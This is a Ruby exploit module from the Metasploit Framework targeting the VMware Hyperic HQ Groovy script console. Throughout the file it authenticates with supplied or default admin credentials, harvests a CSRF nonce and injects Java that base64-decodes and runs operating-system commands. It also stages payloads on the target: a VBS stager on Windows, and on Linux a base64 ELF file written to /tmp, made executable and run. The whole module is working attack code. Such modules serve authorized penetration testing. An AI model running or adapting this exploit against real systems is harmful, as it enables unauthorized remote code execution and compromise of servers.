##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerVBS
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VMware Hyperic HQ Groovy Script-Console Java 
Execution',
      'Description'    => %q{
        This module uses the VMware Hyperic HQ Groovy script console to 
execute
        OS commands using Java. Valid credentials for an application 
administrator
        user account are required. This module has been tested 
successfully with
        Hyperic HQ 4.6.6 on Windows 2003 SP2 and Ubuntu 10.04 systems.
      },
      'Author'         =>
        [
          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'WfsDelay'   => '15',
        },
      'References'     =>
        [
          ['URL', 
'https://pubs.vmware.com/vfabric5/topic/com.vmware.vfabric.hyperic.4.6/ui-Groovy.html']
        ],
      'Targets'        =>
        [
          # Tested on Hyperic HQ versions 4.5.2-win32 and 4.6.6-win32 on 
Windows XP SP3 and Ubuntu 10.04
          ['Automatic', {} ],
          ['Windows',  {'Arch' => ARCH_X86, 'Platform' => 'win'}],
          ['Linux',    {'Arch' => ARCH_X86, 'Platform' => 'linux' }],
          ['Unix CMD', {'Arch' => ARCH_CMD, 'Platform' => 'unix', 
'Payload' => {'BadChars' => "\x22"}}]
      ],
      'Platform'       => %w{ win linux unix },
      'Privileged'     => false, # Privileged on Windows but not on *nix 
targets
      'DisclosureDate' => 'Oct 10 2013',
      'DefaultTarget'  => 0))
 
    register_options(
      [
        OptBool.new('SSL', [true, 'Use SSL', true]),
        Opt::RPORT(7443),
        OptString.new('USERNAME',  [ true, 'The username for the 
application', 'hqadmin' ]),
        OptString.new('PASSWORD',  [ true, 'The password for the 
application', 'hqadmin' ]),
        OptString.new('TARGETURI', [ true, 'The path to HypericHQ', '/' 
]),
      ], self.class)
  end
 
  #
  # Login
  #
  def login(user, pass)
    @cookie = "JSESSIONID=#{Rex::Text.rand_text_hex(32)}"
 
    res = send_request_cgi({
      'uri'       => normalize_uri(@uri.path, 
"j_spring_security_check?org.apache.catalina.filters.CSRF_NONCE="),
      'method'    => 'POST',
      'cookie'    => @cookie,
      'vars_post' => {
        'j_username' => Rex::Text.uri_encode(user, 'hex-normal'),
        'j_password' => Rex::Text.uri_encode(pass, 'hex-normal'),
        'submit'     => 'Sign+in'
      }
    })
 
    res
  end
 
  #
  # Check access to the Groovy script console and get CSRF nonce
  #
  def get_nonce
    res = send_request_cgi({
      'uri' => normalize_uri(@uri.path, 
"mastheadAttach.do?typeId=10003"),
      'cookie' => @cookie
    })
 
    if not res or res.code != 200
      print_warning("#{peer} - Could not access the script console")
    end
 
    if res.body =~ 
/org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F\d]+)/
      @nonce = $1
      vprint_status("#{peer} - Found token '#{@nonce}'")
    end
  end
 
  #
  # Check credentials and check for access to the Groovy console
  #
  def check
 
    @uri = target_uri
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
 
    # login
    print_status("#{peer} - Authenticating as '#{user}'")
    res  = login(user, pass)
    if res and res.code == 302 and res.headers['location'] !~ 
/authfailed/
      print_good("#{peer} - Authenticated successfully as '#{user}'")
      # check access to the console
      print_status("#{peer} - Checking access to the script console")
      get_nonce
      if @nonce.nil?
        return Exploit::CheckCode::Detected
      else
        return Exploit::CheckCode::Vulnerable
      end
    elsif res.headers.include?('X-Jenkins') or res.headers['location'] 
=~ /authfailed/
      print_error("#{peer} - Authentication failed")
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
 
  end
 
  def on_new_session(client)
    if not @to_delete.nil?
      print_warning("#{peer} - Deleting #{@to_delete} payload file")
      execute_command("rm #{@to_delete}")
    end
  end
 
  def http_send_command(java)
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(@uri.path, 
'hqu/gconsole/console/execute.hqu?org.apache.catalina.filters.CSRF_NONCE=')+@nonce,
      'cookie'    => @cookie,
      'vars_post' => {
        'code' => java # java_craft_runtime_exec(cmd)
      }
    })
    if res and res.code == 200 and res.body =~ /Executed/
      vprint_good("#{peer} - Command executed successfully")
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - Failed to execute 
the command.")
    end
    # version 4.6.6 returns a new CSRF nonce in the response
    if res.body =~ 
/org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F\d]+)/
      @nonce = $1
      vprint_status("#{peer} - Found token '#{@nonce}'")
    # version 4.5.2 does not, so we request a new one
    else
      get_nonce
    end
 
    return res
  end
 
  # Stolen from jenkins_script_console.rb
  def java_craft_runtime_exec(cmd)
    decoder = Rex::Text.rand_text_alpha(5, 8)
    decoded_bytes = Rex::Text.rand_text_alpha(5, 8)
    cmd_array = Rex::Text.rand_text_alpha(5, 8)
    jcode =  "sun.misc.BASE64Decoder #{decoder} = new 
sun.misc.BASE64Decoder();\n"
    jcode << "byte[] #{decoded_bytes} = 
#{decoder}.decodeBuffer(\"#{Rex::Text.encode_base64(cmd)}\");\n"
 
    jcode << "String [] #{cmd_array} = new String[3];\n"
    if @my_target['Platform'] == 'win'
      jcode << "#{cmd_array}[0] = \"cmd.exe\";\n"
      jcode << "#{cmd_array}[1] = \"/c\";\n"
    else
      jcode << "#{cmd_array}[0] = \"/bin/sh\";\n"
      jcode << "#{cmd_array}[1] = \"-c\";\n"
    end
    jcode << "#{cmd_array}[2] = new String(#{decoded_bytes}, 
\"UTF-8\");\n"
    jcode << "Runtime.getRuntime().exec(#{cmd_array});"
    jcode
  end
 
  def java_get_os
    jcode = "System.getProperty(\"os.name\").toLowerCase();"
 
    return jcode
  end
 
  def execute_command(cmd, opts = {})
    vprint_status("#{peer} - Attempting to execute: #{cmd}")
    http_send_command(java_craft_runtime_exec(cmd))
  end
 
  # Stolen from jenkins_script_console.rb
  def linux_stager
    cmds = "echo LINE | tee FILE"
    exe  = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
    base64 = Rex::Text.encode_base64(exe)
    base64.gsub!(/\=/, "\\u003d")
    file = rand_text_alphanumeric(6+rand(4))
 
    execute_command("touch /tmp/#{file}.b64")
    cmds.gsub!(/FILE/, "/tmp/" + file + ".b64")
    base64.each_line do |line|
      line.chomp!
      cmd = cmds
      cmd.gsub!(/LINE/, line)
      execute_command(cmds)
    end
 
    execute_command("base64 -d /tmp/#{file}.b64|tee /tmp/#{file}")
    execute_command("chmod +x /tmp/#{file}")
    execute_command("rm /tmp/#{file}.b64")
 
    execute_command("/tmp/#{file}")
    @to_delete = "/tmp/#{file}"
  end
 
  def get_target
    res = http_send_command(java_get_os)
 
    if res and res.code == 200 and res.body =~ 
/"result":"(.*)","timeStatus/
      os = $1
    else
      return nil
    end
 
    case os
    when /win/
      return targets[1]
    when /linux/
      return targets[2]
    when /nix/
    when /mac/
    when /aix/
    when /sunow/
      return targets[3]
    else
      return nil
    end
 
  end
 
 
  def exploit
 
    # login
    @uri = target_uri
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    res  = login(user, pass)
    if res and res.code == 302 and res.headers['location'] !~ 
/authfailed/
      print_good("#{peer} - Authenticated successfully as '#{user}'")
    else
      fail_with(Exploit::Failure::NoAccess, "#{peer} - Authentication 
failed")
    end
 
    # check access to the console and get CSRF nonce
    print_status("#{peer} - Checking access to the script console")
    get_nonce
 
    # check operating system
    if target.name =~ /Automatic/
      print_status("#{peer} - Trying to detect the remote target...")
      @my_target = get_target
      if @my_target.nil?
        fail_with(Failure::NoTarget, "#{peer} - Failed to detect the 
remote target")
      else
        print_good("#{peer} - #{@my_target.name} target found")
      end
    else
      @my_target = target
    end
 
    # send payload
    case @my_target['Platform']
    when 'win'
      print_status("#{peer} - Sending VBS stager...")
      execute_cmdstager({:linemax => 2049})
    when 'unix'
      print_status("#{peer} - Sending UNIX payload...")
      http_send_command(java_craft_runtime_exec(payload.encoded))
    when 'linux'
      print_status("#{rhost}:#{rport} - Sending Linux stager...")
      linux_stager
    end
 
  end
end

